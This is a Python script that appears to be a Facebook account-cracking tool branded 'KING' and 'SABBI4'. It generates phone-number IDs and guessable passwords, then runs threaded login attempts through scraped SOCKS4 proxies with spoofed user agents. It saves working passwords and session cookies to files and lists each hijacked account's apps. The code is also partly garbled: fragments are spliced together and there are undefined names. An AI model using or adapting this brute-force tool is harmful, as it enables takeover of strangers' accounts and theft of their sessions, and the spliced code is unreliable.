import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)

        
os.system('clear')
print("\033[\033[1;91mTOOLS UPDATE SUCCESSFUL")
time.sleep(5)
os.system('clear')        

logo = ("""
 \t\033[38;5;46m
\t\033[38;5;46m\033[38;5;46mKG    KG \33[38;5;196mKING \033[34;1mKG    KG  \033[38;5;46mKINGKG    \33[38;5;196m
\t\033[38;5;46m\033[38;5;46mKG   KG   \33[38;5;196mKG  \033[34;1mKG#   KG \033[38;5;46mKG    KG   \033[38;5;46m
\t\033[38;5;46m\033[38;5;46mKG  KG    \33[38;5;196mKG  \033[34;1mKING  KG \033[38;5;46mKG         \33[38;5;196m
\t\033[38;5;46m\033[38;5;46mKING#     \33[38;5;196mKG  \033[34;1mKG KG KG \033[38;5;46mKG   KING  \033[38;5;46m
\t\033[38;5;46m\033[38;5;46mKG  KG    \33[38;5;196mKG  \033[34;1mKG  KING \033[38;5;46mKG    KG   \33[38;5;196m
\t\033[38;5;46m\033[38;5;46mKG   KG   \33[38;5;196mKG  \033[34;1mKG   KG# \033[38;5;46mKG    KG   \033[38;5;46m
\t\033[38;5;46m\033[38;5;46mKG    KG \33[38;5;196mKING \033[34;1mKG    KG  \033[38;5;46mKINGKG    \33[38;5;196m
\t\033[38;5;46m
\33[38;5;196m     \033[38;5;46m\33[38;5;196m
\33[38;5;196m      \033[38;5;46m[]\x1b[1;96m\x1b[38;5;208m        : [] \33[38;5;196m         
\33[38;5;196m      \033[38;5;46m[]\x1b[1;96m\x1b[38;5;208m    : [] \33[38;5;196m         
\33[38;5;196m      \033[38;5;46m[]\x1b[1;96m\x1b[38;5;208m      : []-\33[38;5;196m       
\33[38;5;196m      \033[38;5;46m[]\x1b[1;96m\x1b[38;5;208m  : []\33[38;5;196m        
\33[38;5;196m      \033[38;5;46m[]\x1b[1;96m\x1b[38;5;208m    : []+\33[38;5;196m     
\33[38;5;196m      \033[38;5;46m[]\x1b[1;96m \x1b[38;5;208m  : []-\33[38;5;196m     
\33[38;5;196m      \033[38;5;46m[]\x1b[1;96m \x1b[38;5;208m: []\33[38;5;196m            
 \33[38;5;196m    \033[1;31m\33[38;5;196m""")



def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))



class Main:
    def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        os.system("clear")
        print(logo)
        print(" [1] Random Uid Clone")
        print(" [0] Exit")
       ## print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
        King =input(" [?] Choose : ")
        
        if King in ["1", "1"]:
            M1()
        else:
            exit()
def M1():
    user=[]
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 017/ 018/ 019/ 016/ 013/ 014 ')
  ### print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
    kode = input(' [?] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
    ###print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;92m YOUR SIM CODE : '+kode)
        print(' \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\33[1;92m TOTAL ID : '+tl)
        ###print('\33[1;92m━━━━━━━━━━━━━━━━━━━━━\33[1;91m━━━━━━━━━━━━━━━━━━━━━━')
        #-------------[ CRACK-FROM-FILE ]------------------#
def C1():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			fileX = input ('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m ENTER YOUR FILE :\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mTOTAL ID : \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print("\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mFILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m CLONE ONLY MIX ID')
	hu = input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\033[1;92m[\033[1;36m\033[1;92m]\033[0;92mWRONG OPTION BARA')
		exit()
	
	print(f'\033[1;92m[\033[1;33m1\033[1;92m]\033[0;92m MOBILE ')
	hc = input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92m PASSWORD MENU \x1b[1;94m MANUAL PASSWORD \x1b[1;91m[M1]\n\x1b[1;93m AUTO PASSWORD \x1b[1;96m[M2] \x1b[1;92m\n [\033[1;92m\033[1;31m\033[1;92m] CHOOSE : \x1b[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input('\033[1;92m[\033[1;32m\033[1;92m]\033[0;92mAdd Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 

#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	banner()
	#print(f"\033[1;92m[\033[1;92m\033[1;31m\033[1;92m] YOUR NAME      \033[1;34m: \033[0;92m"+str(SABBI4_NAME))
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] TOTAL ID       \033[1;34m: \033[0;92m"+str(len(id)))
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START TIME     \033[1;34m: \033[0;96m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] START DATE     \033[1;34m: \033[0;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	print(f"\033[1;92m[\033[1;92m\033[1;32m\033[1;92m] NOTE = \33[1;92m[USE AIRPLANE MODE ON OF FOR OK IDZ] ")
	print(f'\033[1;92m---------------------------------------------------------')
	#file()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'@123')
					pwv.append(frs+'first@@@')
					pwv.append(frs+'last@@@')
					pwv.append(frs+'first###')
					pwv.append(frs+'frist123')
					pwv.append(frs+'first last')
					pwv.append(frs+'firstlast')
					pwv.append(frs+'last###')
					pwv.append(frs+'last123')
					pwv.append(frs+'last#?')
					pwv.append(frs+'@@@???')
					pwv.append(frs+'first@?')
					pwv.append(frs+'first#?')
					pwv.append(frs+'last@?')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'@123')
					pwv.append(frs+'1234')
					pwv.append(frs+'first@@@')
					pwv.append(frs+'last@@@')
					pwv.append(frs+'first last')
					pwv.append(frs+'frist###')
					pwv.append(frs+'last###')
					pwv.append(frs+'#@')
					pwv.append(frs+'last123')
					pwv.append(frs+'firstslast')
					pwv.append(frs+'first123')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f"\033[1;92m---------------------------------------------------------")
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;92m CRACK COMPLETE ')
	print(f' \x1b[1;91m\x1b[1;96m\x1b[1;92m ðŸ¥° OK : {h}%s '%(ok))
		
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{bo} [SABBI4] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mSABBI4-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [\033[1;92mSABBI4-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
				cek_apk(session,coki)
				open('/sdcard/SABBI4-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
				akun.append(idf+'|'+pw)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in ok.txt,cp.txt')

def rcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r [KING] %s|%s\33[1;92m[OK-%s\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Opera";v="96"',
            'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5658.224", "Opera";v="96.0.4160.147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"macOS"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\x1b[38;5;46m[KING-OK] '+cid+' | '+ps+'\033[1;97m')
                print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
                open('KING-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid);cek_apk(coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\33[1;91m[CHECKPOINT] '+uid+' | '+ps+'\33[0;97m')
                open('KING-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                break
            else:
                continue
        loop+=1
    
    except:
        pass
Main()